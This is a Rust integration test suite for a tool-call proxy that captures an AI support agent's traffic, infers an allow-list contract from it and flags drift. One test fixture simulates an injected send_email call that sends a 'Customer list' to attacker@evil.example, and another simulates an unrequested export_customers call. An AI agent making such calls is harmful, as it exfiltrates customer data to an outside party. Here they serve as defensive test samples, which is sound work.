//! `mcp-proxy --capture` + `cloakpipe infer`: the support agent goes from no
//! contract to a draft that reproduces the hand-written one's key rules
//! (spec "infer + prove", build steps 1 and 2), and `infer --diff` flags
//! traffic the active contract refuses.

use serde_json::{json, Value};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_cloakpipe"))
}

fn support(name: &str) -> String {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../examples/support-agent").join(name).to_string_lossy().into_owned()
}

fn call(id: usize, tool: &str, args: Value) -> String {
    json!({ "jsonrpc": "2.0", "id": id, "method": "tools/call", "params": { "name": tool, "arguments": args } }).to_string()
}

/// One ticket worked through the proxy with capture on: `extra` lines after
/// the ordinary work. Returns the proxy's exit status.
fn work_ticket(dir: &Path, captures: &Path, i: usize, extra: &[String], flags: &[&str]) -> std::process::Output {
    let ticket = format!("T-{}", 1040 + i);
    let email = format!("customer{i}@mail{}.example", i % 4);
    let task = json!({ "taskId": format!("t-{i}"), "ticket": { "id": ticket, "customer_email": email } });
    let task_path = dir.join(format!("task-{i}.json"));
    std::fs::write(&task_path, task.to_string()).unwrap();
    let mut lines = vec![
        json!({ "jsonrpc": "2.0", "id": 0, "method": "tools/list" }).to_string(),
        call(1, "read_ticket", json!({ "ticket_id": ticket })),
        call(2, "send_email", json!({ "ticket_id": ticket, "to": email, "subject": format!("About {ticket}"), "body": format!("Hello, your ticket {ticket} is resolved. Refund {i} is on its way.") })),
        call(3, "issue_refund", json!({ "ticket_id": ticket, "amount": 12 + i * 7 })),
    ];
    if i.is_multiple_of(3) {
        let internal = ["billing", "escalations", "qa"][i % 9 / 3];
        lines.push(call(4, "send_email", json!({ "ticket_id": ticket, "to": format!("{internal}@ourcompany.com"), "subject": "FYI", "body": format!("Refund issued on {ticket}.") })));
    }
    lines.extend(extra.iter().cloned());
    let mut child = bin()
        .current_dir(dir)
        .args(["mcp-proxy", "--upstream", &format!("python3 {}", support("mock_upstream.py")), "--capture"])
        .arg(captures)
        .args(["--task-context"])
        .arg(&task_path)
        .args(flags)
        .env("CLOAKPIPE_HOME", dir.join("home"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(format!("{}\n", lines.join("\n")).as_bytes()).unwrap();
    child.wait_with_output().unwrap()
}

/// Twelve ordinary tickets and one injected one (an email to an attacker
/// with an oversized body).
fn capture_traffic(dir: &Path) -> PathBuf {
    let captures = dir.join("captures");
    for i in 0..12 {
        let extra = if i == 7 {
            vec![call(9, "send_email", json!({ "ticket_id": format!("T-{}", 1047), "to": "attacker@evil.example", "subject": "Customer list", "body": "x".repeat(5000) }))]
        } else {
            Vec::new()
        };
        let out = work_ticket(dir, &captures, i, &extra, &[]);
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    }
    captures
}

fn infer(dir: &Path, args: &[&str]) -> (i32, String, String) {
    let out = bin().current_dir(dir).arg("infer").args(args).output().unwrap();
    (out.status.code().unwrap_or(-1), String::from_utf8_lossy(&out.stdout).into_owned(), String::from_utf8_lossy(&out.stderr).into_owned())
}

#[test]
fn infer_drafts_the_support_contract_from_shadow_traffic() {
    let dir = tempfile::tempdir().unwrap();
    let captures = capture_traffic(dir.path());
    let draft = dir.path().join("draft.yaml");
    let (code, _, err) = infer(dir.path(), &[captures.to_str().unwrap(), "--out", draft.to_str().unwrap(), "--release", "support-agent"]);
    assert_eq!(code, 0, "{err}");
    let text = std::fs::read_to_string(&draft).unwrap();

    // The recipient rule of the hand-written contract, inferred.
    let to = text.lines().find(|l| l.trim_start().starts_with("to:")).unwrap();
    assert!(to.contains(r#"one_of_context: ["ticket.customer_email"]"#), "{text}");
    assert!(to.contains(r#"or_pattern: "@ourcompany\\.com$""#), "{text}");
    assert!(text.contains(r#"ticket_id: { type: string, one_of_context: ["ticket.id"], required: true }"#), "{text}");
    // Never called: refused. The injected call: excluded, not widened in.
    assert!(text.contains("# NOT DECLARED (offered by the server, never called): export_customers"), "{text}");
    assert!(text.contains("outlier excluded: send_email"), "{text}");
    assert!(!text.contains("evil.example"), "{text}");
    let body = text.lines().find(|l| l.trim_start().starts_with("body:")).unwrap();
    assert!(!body.contains("max_len: 6000") && !body.contains("max_len: 5000"), "{body}");
    // Ranges with a margin and a suggested (inactive) approval.
    assert!(text.contains("amount: { type: integer, min: 0, max: 120, required: true }"), "{text}");
    assert!(text.contains(r#"# approval: { when: "amount > 90""#), "{text}");
    assert!(text.contains("Self-check: 40/41 captured calls pass this draft"), "{text}");

    // The draft is a manifest the gate loads.
    let out = bin().args(["manifest", "validate"]).arg(&draft).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));

    // Diffing the captures against the draft: only the excluded attack
    // drifts (its first violation: the 5000-character body).
    let (code, report, _) = infer(dir.path(), &[captures.to_str().unwrap(), "--diff", draft.to_str().unwrap(), "--json"]);
    assert_eq!(code, 1, "{report}");
    let report: Value = serde_json::from_str(&report).unwrap();
    assert_eq!(report["drift"].as_array().unwrap().len(), 1, "{report}");
    assert_eq!(report["drift"][0]["tool"], "send_email");
    assert_eq!(report["drift"][0]["reason"], "argument_invalid");
    assert_eq!(report["drift"][0]["path"], "/body");
    assert_eq!(report["drift"][0]["example"], "<token, 5000 chars>");
}

#[test]
fn infer_diff_against_the_hand_written_contract() {
    let dir = tempfile::tempdir().unwrap();
    let captures = dir.path().join("captures");
    for i in 0..6 {
        let extra = if i == 2 { vec![call(9, "export_customers", json!({}))] } else { Vec::new() };
        assert!(work_ticket(dir.path(), &captures, i, &extra, &[]).status.success());
    }
    let (code, report, err) = infer(dir.path(), &[captures.to_str().unwrap(), "--diff", &support("cloakpipe.manifest.yaml")]);
    assert_eq!(code, 1, "{report}{err}");
    assert!(report.contains("export_customers: 1 call(s)"), "{report}");
    assert!(report.contains("issue_refund.amount: max 500, observed traffic fits max"), "{report}");
    assert!(report.contains("result: DRIFT"), "{report}");
}

#[test]
fn capture_is_shadow_only_and_shapes_hide_values() {
    let dir = tempfile::tempdir().unwrap();
    let captures = dir.path().join("captures");
    // Enforce mode: refused before anything starts.
    let out = work_ticket(dir.path(), &captures, 0, &[], &["--manifest", &support("cloakpipe.manifest.yaml")]);
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("--capture is only available in shadow mode"));
    // Shapes: no value reaches the file, the binding is still found. (Tickets
    // without an internal copy: a domain cannot be recovered from shapes.)
    for i in [1, 2, 4, 5, 7, 8] {
        assert!(work_ticket(dir.path(), &captures, i, &[], &["--capture-shapes"]).status.success());
    }
    for f in std::fs::read_dir(&captures).unwrap() {
        let path = f.unwrap().path();
        if path.file_name().unwrap().to_str().unwrap().starts_with("capture-") {
            let text = std::fs::read_to_string(&path).unwrap();
            assert!(!text.contains("@mail") && !text.contains("T-104"), "{text}");
        }
    }
    let (code, draft, err) = infer(dir.path(), &[captures.to_str().unwrap(), "--delete-after"]);
    assert_eq!(code, 0, "{err}");
    assert!(draft.contains(r#"to: { type: string, one_of_context: ["ticket.customer_email"]"#), "{draft}");
    assert!(draft.contains("Self-check: skipped (shape-only captures)"), "{draft}");
    assert!(err.contains("deleted 6 capture file(s)"), "{err}");
}
